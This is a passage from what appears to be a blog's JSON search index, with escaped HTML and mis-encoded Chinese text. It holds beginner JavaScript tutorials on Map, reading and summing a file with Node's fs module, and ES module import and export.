function!\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"k\"\u003edelete\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;âœˆï¸\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;âœˆï¸\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// false\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eclear\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// setting key-value pairs is chainable\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸ”§\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Wrench\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸ¸\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Guitar\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸ•¹\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Joystick\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Even another map can be a key\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Oh gosh!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyMap\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026#39;Oh gosh!\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿­ä»£å®ƒçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨ for \u0026hellip; ofï¼Œé¡ºåºæ˜¯ä¸¥æ ¼æŒ‰ç…§ä½ æ’å…¥çš„é¡ºåºæ¥çš„ï¼š\u003c/p\u003e","title":"javascriptsä¸­çš„map"},{"content":"åƒé‡Œä¹‹è¡Œå§‹äºè¶³ä¸‹ï¼Œjavascript æ¨¡å—æ¼«å¤©é£ï¼Œèƒ½åšçš„äº‹ä¹Ÿæ˜¯äº”èŠ±å…«é—¨ã€‚æˆ‘ä»¬æ¥å®è·µä¸€ä¸‹\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\né‡Œé¢æ˜¯ä¸€è¡Œè¡Œæ•°æ®ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ‰€æœ‰å€¼å–æ•´æ±‚å’Œï¼Œæ–‡ä»¶ä¸­æœ‰æŸäº›ç©ºè¡Œ\nå¾ˆç®€å•ï¼Œç¨‹åºå¦‚ä¸‹ï¼š\nvar fs = require(\u0026#39;fs\u0026#39;); calculate = () =\u0026gt; { fs.readFile(\u0026#39;data.txt\u0026#39;, \u0026#39;utf8\u0026#39;, (err, data) =\u0026gt; { if (err) { throw new Error(err) } const arr = data.split(\u0026#39;\\r\\n\u0026#39;); const result = arr .filter(e =\u0026gt; e) .map(parseFloat) .reduce((curr, next) =\u0026gt; curr + next); console.log(\u0026#39;RESULT: \u0026#39;, result); }); } è¶…çº§ç®€å•å§\nå…³é”®å°±æ˜¯ä¸Šé¢çš„é“¾å¼è°ƒç”¨\nsplit ç”¨æ¥åˆ†å‰²æ¯ä¸€è¡Œ filter ç”¨æ¥å»æ‰ç©ºè¡Œ map ç”¨æ¥æŠŠæ¯ä¸€è¡Œéƒ½è½¬åŒ–æˆæ•´æ•° reduce ç”¨æ¥æ±‚å’Œ ","permalink":"https://rendoumi.com/posts/20220522-javascirpts_fs/","summary":"\u003cp\u003eåƒé‡Œä¹‹è¡Œå§‹äºè¶³ä¸‹ï¼Œjavascript æ¨¡å—æ¼«å¤©é£ï¼Œèƒ½åšçš„äº‹ä¹Ÿæ˜¯äº”èŠ±å…«é—¨ã€‚æˆ‘ä»¬æ¥å®è·µä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220524155511802\" loading=\"lazy\" src=\"/posts/20220522-javascirpts_fs/image-20220524155511802.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé‡Œé¢æ˜¯ä¸€è¡Œè¡Œæ•°æ®ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ‰€æœ‰å€¼å–æ•´æ±‚å’Œï¼Œæ–‡ä»¶ä¸­æœ‰æŸäº›ç©ºè¡Œ\u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼Œç¨‹åºå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evar \u003cspan class=\"nv\"\u003efs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e require\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;fs\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ecalculate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fs.readFile\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;data.txt\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr, data\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            throw new Error\u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        const \u003cspan class=\"nv\"\u003earr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e data.split\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        const \u003cspan class=\"nv\"\u003eresult\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e arr\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .filter\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .map\u003cspan class=\"o\"\u003e(\u003c/span\u003eparseFloat\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            .reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003ecurr, next\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; curr + next\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        console.log\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;RESULT: \u0026#39;\u003c/span\u003e, result\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¶…çº§ç®€å•å§\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220524155746288\" loading=\"lazy\" src=\"/posts/20220522-javascirpts_fs/image-20220524155746288.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…³é”®å°±æ˜¯ä¸Šé¢çš„é“¾å¼è°ƒç”¨\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003esplit ç”¨æ¥åˆ†å‰²æ¯ä¸€è¡Œ\u003c/li\u003e\n\u003cli\u003efilter ç”¨æ¥å»æ‰ç©ºè¡Œ\u003c/li\u003e\n\u003cli\u003emap ç”¨æ¥æŠŠæ¯ä¸€è¡Œéƒ½è½¬åŒ–æˆæ•´æ•°\u003c/li\u003e\n\u003cli\u003ereduce ç”¨æ¥æ±‚å’Œ\u003c/li\u003e\n\u003c/ul\u003e","title":"javascriptçš„å®é™…åº”ç”¨-fsæ¨¡å—"},{"content":"JavaScript Module æ˜¯ä»€ä¹ˆ ä¸€ä¸ª JavaScript module æ¨¡å—å‡†ç¡®çš„è¯´å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå…è®¸ä½ æŠŠä»£ç  export å¯¼å‡ºæ¥å¤ç”¨ï¼Œè¿™æ ·åˆ«çš„ JavaScript æ–‡ä»¶å¯ä»¥ import è¿™ä¸ªæ–‡ä»¶æŠŠå®ƒä½œä¸ºåº“æ–‡ä»¶æ¥ä½¿ç”¨äº†ã€‚\næ¨¡å—ä¸»è¦æ˜¯ç”¨åœ¨å·¥ç¨‹æ–‡ä»¶ä¸­ï¼Œç”¨æ¥æŠŠä»£ç å…±äº«ç»™å…¶ä»–æ–‡ä»¶ç”¨ï¼Œjavascipt çš„æ¨¡å—å¯ä»¥è¯´æ˜¯æ»¡å¤©é£ã€‚\nè¿™é‡Œå‘¢è®¨è®ºçš„æ˜¯å‰ç«¯çš„éƒ¨åˆ†ï¼Œå³æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ javascripts module éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿è¡Œåœ¨åç«¯çš„ Node.js çš„éƒ¨åˆ†ï¼Œåç«¯ç°åœ¨å·²ç»å‘å‰ç«¯é æ‹¢äº†ã€‚\nES6æ ‡å‡†å‘å¸ƒåï¼Œmoduleæˆä¸ºæ ‡å‡†ï¼Œæ ‡å‡†ä½¿ç”¨æ˜¯ä»¥exportæŒ‡ä»¤å¯¼å‡ºæ¥å£ï¼Œä»¥importå¼•å…¥æ¨¡å—ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬ä¸€è´¯çš„nodeæ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶é‡‡ç”¨çš„æ˜¯CommonJSè§„èŒƒï¼Œä½¿ç”¨requireå¼•å…¥æ¨¡å—ï¼Œä½¿ç”¨module.exportså¯¼å‡ºæ¥å£ã€‚è¿™ç‚¹ä¹Ÿç†è§£æ¸…æ¥šã€‚\næˆ‘ä»¬ä»é›¶æ¥ä¸€æ­¥æ­¥å¼€å§‹å§\nå¦‚ä½•æŠŠä¸€ä¸ª JavaScript æ–‡ä»¶è½¬æ¢ä¸º ES çš„ module 1: åˆ›å»ºä¸€ä¸ª project ç›®å½• è¿™ä¸ªç›®å½•ç”¨æ¥æ”¾ HTML å’Œ JavaScript æ–‡ä»¶\n2: å»ºç«‹ä½ çš„ code ä»£ç æ–‡ä»¶ åœ¨ project æ–‡ä»¶å¤¹ä¸­å»ºç«‹2ä¸ªæ–‡ä»¶:\nindex.html index.js 3: æ·»åŠ  JavaScript æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ä¸­ æ‰“å¼€index.html ç¼–è¾‘å®ƒï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; \u0026lt;!-- Add the \u0026#34;index.js\u0026#34; JavaScript file to this HTML document --\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¼•ç”¨äº† index.js , å¹¶å®šä¹‰å®ƒ type=\u0026ldquo;module\u0026rdquo;ï¼Œè¿™æ˜¾å¼æŒ‡æ˜äº† index.js æ˜¯ä¸€ä¸ª ES çš„moduleã€‚\né‚£ä¹ˆï¼Œå¦‚æœæœ‰äº†ä¸€ä¸ª ES çš„ moduleï¼Œå¦‚ä½•ä½¿ç”¨å®ƒå‘¢ï¼Œä¹Ÿä¸¾ä¸ªä¾‹å­ï¼š\nå¦‚ä½•ä½¿ç”¨ä¸€ä¸ª ES çš„ Module 1: å»ºç«‹ä¸€ä¸ª project ç›®å½• åŒæ ·æ˜¯æ”¾ html å’Œ module æ–‡ä»¶çš„ã€‚\n2: å»ºç«‹ code æ–‡ä»¶ åœ¨ project æ–‡ä»¶å¤¹ä¸‹å»ºç«‹å¦‚ä¸‹æ–‡ä»¶:\nindex.html module-1.js module-2.js 3: å¢åŠ  modules æ–‡ä»¶çš„å¼•ç”¨åˆ° HTML æ–‡ä»¶ ç¼–è¾‘ index.html æ–‡ä»¶ï¼Œå¢åŠ å¯¹ module çš„å¼•ç”¨:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;ES Module - zhang ranrui\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;ES Module Tutorial\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;Check the console\u0026lt;/h2\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;module-2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 4: æµè§ˆä½ çš„ index.html æ³¨æ„ï¼Œè¿™é‡Œåªèƒ½åœ¨ localhost çš„æœåŠ¡å™¨ä¸Šæµè§ˆï¼Œç›´æ¥æµè§ˆæœ¬åœ°æ–‡ä»¶ä¼šæŠ¥ cors çš„é”™ã€‚\næ€ä¹ˆ Export å¯¼å‡ºä¸€ä¸ª Module ä¸­çš„ä»£ç  æœ‰ä¸¤ç§ä½¿ç”¨æ–¹æ³•\nåœ¨ä»£ç å‰ä½¿ç”¨ export å…³é”®å­— ä½¿ç”¨ export å£°æ˜è¯­å¥ ä¸€ã€åœ¨ä»£ç å‰ä½¿ç”¨ export å…³é”®å­— æ³¨æ„ï¼šæ˜¯åœ¨æ­£å¼ä»£ç ä¹‹å‰\n// module-1.js // Export the \u0026#34;bestClub\u0026#34; variable: export const bestClub = \u0026#34;Your Club\u0026#34;; å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š\n// Export the \u0026#34;multiply\u0026#34; function: export function multiply(x, y) { return x * y; } äºŒã€ä½¿ç”¨ export å£°æ˜è¯­å¥ å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ export å£°æ˜è¯­å¥ï¼Œè¿™ç§æ–¹å¼ç”¨ {} åŒ…è£¹ è¦å¯¼å‡ºçš„å˜é‡ï¼Œä¸­é—´çš„å˜é‡åç”¨é€—å·æ¥éš”å¼€ã€‚\n// Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Create a function named \u0026#34;multiply\u0026#34;: function multiply(x, y) { return x * y; } // Create an array named \u0026#34;fruits\u0026#34;: const fruits = [\u0026#34;Mango\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Orange\u0026#34;, \u0026#34;Lemon\u0026#34;]; // Export the three statements above: export { bestClub, multiply, fruits }; å¯¼å‡ºæœ‰äº†ï¼Œæ€æ ·å¯¼å…¥åˆ«çš„æ¨¡å— Exported çš„ä»£ç å‘¢ï¼Ÿ æ¥ä¸Šçš„ä¾‹å­ï¼Œåªå¯¼å…¥ä¸€ä¸ªå˜é‡ï¼š\n// module-2.js import { bestClub } from \u0026#34;./module-1.js\u0026#34;; å¯¼å…¥æ‰€æœ‰å˜é‡\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;./module-1.js\u0026#34;; æ³¨æ„./æ˜¯è¡¨ç¤ºå½“å‰è·¯å¾„ï¼Œå¦‚æœè·¯å¾„ä¸å¯¹ï¼Œæœ‰å¯èƒ½éœ€è¦å…¨è·¯å¾„å¯¼å…¥\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;/codesweetly/blog/notes/modular-javascript/es-modules/module-1.js\u0026#34;; æ³¨æ„åœ¨åç«¯ Node.js å’Œ module bundlers ä¸­ï¼Œæ˜¯å…è®¸ä½ ä¸å†™æ–‡ä»¶ååç¼€çš„ï¼Œæ¯”å¦‚ä¸‹é¢\n// Import three items from the module-1.js file: import { bestClub, multiply, fruits } from \u0026#34;module-1\u0026#34;; ä½†æ˜¯ï¼Œåœ¨ ES modules ä¸­ï¼Œä¸å…è®¸çœç•¥æ–‡ä»¶åç¼€ã€‚\nå¦‚ä½•ä½¿ç”¨ä»åˆ«çš„æ¨¡å— Imported å¯¼å…¥çš„ä»£ç  // module-2.js import { bestClub } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = bestClub + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); æ³¨æ„:\nimport å…³é”®å­—åªèƒ½å‡ºç°åœ¨ modules æ–‡ä»¶ä¸­ï¼Œä¸èƒ½å‡ºç°åœ¨é€šå¸¸çš„ JavaScript ç¨‹åºæ–‡ä»¶ä¸­ã€‚ ä¸€ä¸ªè¢« imported å¯¼å…¥çš„æ¨¡å—åªèƒ½ä½œç”¨äºæœ¬æ–‡ä»¶ä¸­ï¼Œè€Œä¸æ˜¯å…¨å±€å¯ç”¨ã€‚ä½ åªèƒ½åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ JavaScript ä¼šè‡ªåŠ¨æå‡ import è¯­å¥çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨ import ï¼Œç”šè‡³åœ¨ä½¿ç”¨å…¶ä¸­ä»£ç ä¹‹åã€‚ Imported å¯¼å…¥çš„æ¨¡å—ç¼ºçœå¤„äº strict ä¸¥æ ¼æ¨¡å¼ä¸‹ã€‚ å¦‚ä½•å°† Exports å’Œ Imports å¯¼å…¥å¯¼å‡ºçš„æ¨¡å—é‡å‘½å ç”¨ as å³å¯ï¼š\n// module-1.js // Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable as \u0026#34;favoriteTeam\u0026#34;: export { bestClub as favoriteTeam }; æ¥ä¸‹æ¥ä½¿ç”¨å°±ä¸èƒ½æ˜¯ bestclub , è€Œæ˜¯ favoriteTeam äº†ï¼š\n// module-2.js import { favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); åŒæ ·å¯ä»¥åœ¨ import çš„æ—¶å€™ä½¿ç”¨ as\n// module-1.js // Create a variable named \u0026#34;bestClub\u0026#34;: const bestClub = \u0026#34;Your Club\u0026#34;; // Export the bestClub variable: export { bestClub }; // module-2.js import { bestClub as favoriteTeam } from \u0026#34;./module-1.js\u0026#34;; const myBestClub = favoriteTeam + \u0026#34; \u0026#34; + \u0026#34;is my best club.\u0026#34;; console.log(myBestClub); å¦‚ä½•åœ¨ ES Module ä¸­é‡å‘½åå¤šä¸ª Exports å¯¼å‡º å¾ˆç®€å•ï¼Œç”¨asåŠ ä¸Šé€—å·åˆ†å‰²ç¬¦å·\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub as favoriteTeam, fruits as crops, multiply as product }; // module-2.js import { favoriteTeam, crops, product } from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸­é‡å‘½åå¤šä¸ª Import å¯¼å…¥ è·Ÿä¸Šé¢ä¸€æ ·ï¼š\n// module-1.js const bestClub = \u0026#34;Your Club\u0026#34;; const fruits = [\u0026#34;Grape\u0026#34;, \u0026#34;Apple\u0026#34;, \u0026#34;Pineapple\u0026#34;, \u0026#34;Lemon\u0026#34;]; function multiply(x, y) { return x * y; } // Export the three statements above: export { bestClub, fruits, multiply }; // module-2.js import { bestClub as favoriteTeam, fruits as crops, multiply as product } from \u0026#34;./module-1.js\u0026#34;; const bestClub = `I bought ${product(2, 11)} ${crops[2]}s at ${favoriteTeam}.`; console.log(bestClub); å¦‚ä½•åœ¨ ES Module ä¸€å¥è¯ import å¯¼å…¥æ‰€æœ‰å¯¼å‡ºå˜é‡ ç”¨*å·ï¼š\n// Import all exportable features from the \u0026#34;countries.js\u0026#34; module: import * as allCountries from 